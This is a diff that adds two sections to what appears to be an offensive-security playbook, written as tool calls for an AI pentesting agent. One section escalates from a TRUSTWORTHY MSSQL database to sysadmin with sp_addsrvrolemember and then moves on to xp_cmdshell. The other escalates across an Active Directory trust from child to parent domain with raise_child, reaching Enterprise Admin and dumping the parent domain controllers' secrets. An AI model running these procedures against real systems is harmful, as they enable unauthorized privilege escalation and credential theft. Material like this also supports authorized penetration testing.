@@ -92,6 +92,18 @@ mssql_xp_cmdshell(
 → Execute as SA
 ```
 
+### Database-Level Impersonation (TRUSTWORTHY)
+When a database has `is_trustworthy_on=1` and db_owner/impersonate rights:
+```
+mssql_execute_as_user(
+    target="sql.domain.com",
+    database="msdb",
+    query="SELECT SYSTEM_USER; EXEC sp_addsrvrolemember 'your_user','sysadmin';",
+    impersonate_user="dbo"
+)
+→ Escalate to sysadmin, then use mssql_xp_cmdshell
+```
+
 ### Linked Servers
 When linked servers exist:
 ```
@@ -101,6 +113,20 @@ mssql_exec_linked(
     query="SELECT * FROM master..syslogins"
 )
 → Execute on remote server
+```
+
+## Trust Attacks
+
+### Child-to-Parent Escalation
+When a child domain krbtgt hash is available:
+```
+raise_child(
+    child_domain="child.domain.local",
+    username="user",
+    password="pass",  # pragma: allowlist secret
+    target_domain="parent.domain.local"
+)
+→ Enterprise Admin, then secretsdump parent DCs
 ```
 
 ## CVE Exploitation
